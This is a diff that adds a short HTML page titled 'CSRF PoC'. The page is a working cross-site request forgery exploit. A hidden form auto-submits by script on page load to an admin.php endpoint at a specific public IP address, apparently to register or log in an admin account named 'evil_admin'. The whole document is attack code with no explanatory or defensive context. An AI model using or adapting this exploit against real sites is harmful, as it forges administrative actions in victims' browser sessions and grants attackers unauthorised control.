@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CSRF PoC</h1>
+    <form id="csrfForm" action="https://44.204.151.67/registration/admin.php" method="POST">
+      <input type="hidden" name="uname" value="evil_admin">
+      <input type="hidden" name="psw" value="evil_password">
+      <input type="hidden" name="alogin" value="1">
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
+</html>
